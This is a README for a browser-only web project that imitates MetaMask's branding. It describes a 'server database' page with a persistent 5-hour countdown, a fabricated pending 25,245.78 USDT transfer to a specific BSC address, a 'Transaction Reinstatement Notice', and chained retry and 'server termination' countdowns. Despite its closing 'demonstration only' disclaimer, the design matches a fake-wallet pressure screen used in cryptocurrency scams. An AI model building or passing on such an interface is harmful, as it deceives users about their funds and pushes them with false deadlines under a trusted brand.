# MetaMask Portfolio — Server Database + Wallet Dashboard

## Files

| File | Purpose |
|------|---------|
| `index.html` | Server database dashboard — 5-hour reset countdown, pending transaction, reinstatement notice |
| `styles.css` | Styles for `index.html` |
| `app.js` | Logic for `index.html` (countdown, navigation, sheets) |
| `mainportfolio.html` | Wallet dashboard markup |
| `mainportfolio.css` | Styles for `mainportfolio.html` |
| `mainportfolio.js` | Logic for `mainportfolio.html` (server gate, live prices, transact, receive) |
| `README.md` | This file |

Open `index.html` in a browser. No build step, no dependencies.

> Keep all six files in the **same folder** — `mainportfolio.html` loads
> `mainportfolio.css` and `mainportfolio.js` from its own directory.

---

## `index.html` — Server Database Dashboard

On load:

1. **5-hour countdown** — persisted in `localStorage` (`mm-sdb-start`).
   Survives refresh and browser restart. At `00:00:00` it opens `mainportfolio.html`.
2. **Pending transaction** — 25,245.78 USDT to
   `0xfe46bbfb161a724d8a9b77dbaf45d0da3b7ac373`, BSC Smart Chain Mainnet,
   gas 0.0108 BNB, timestamp `17:35:55 UTC · 10|10|2026`, status Pending.
3. **Transaction Reinstatement Notice** — full notice text (5h reset,
   5h reinstatement window, 5h termination countdown, what happens if terminated).

Preserved: `showPage(id)` navigation, section IDs `home`, `portfolio`, `swap`,
`bridge`, `nfts`, `activity`, `learn`, theme toggle, account + pending sheets,
footer nav.

---

## `mainportfolio.html` — Wallet Dashboard

Top of the overview shows the **server gate**:

1. **Retry transaction window — 5 hours** (`mm-retry-start`), with a
   **Retry transaction** button that opens <https://portfolio.metamask.io/>.
2. When it hits zero → **server termination countdown — 5 hours** (`mm-term-start`).
3. When that hits zero → `mm-term-done = 1`, the dashboard hides and the screen
   goes blank with **"Server terminated"**.

Dashboard components: balance hero, live CoinGecko BNB/USDT prices and logos,
performance chart with 24H/7D/30D/90D, assets list, allocation donut,
security card, activity history (9 records with detail sheets),
one-shot Transact flow and the Receive flow.

---

## Reset the demo

```js
// index.html countdown
localStorage.removeItem('mm-sdb-start');

// mainportfolio.html gate
localStorage.removeItem('mm-retry-start');
localStorage.removeItem('mm-term-start');
localStorage.removeItem('mm-term-done');

// portfolio state
localStorage.removeItem('mm-ws-balance');
localStorage.removeItem('mm-ws-tx-start');
localStorage.removeItem('mm-ws-tx-done');
localStorage.removeItem('mm-ws-rx-start');
localStorage.removeItem('mm-ws-rx-done');
```

---

## Notes

Demonstration interface only. Not affiliated with, endorsed by, or connected to
MetaMask or ConsenSys. No real wallet connection, key access or on-chain
transaction occurs. CoinGecko public API is rate-limited — see
https://docs.coingecko.com.

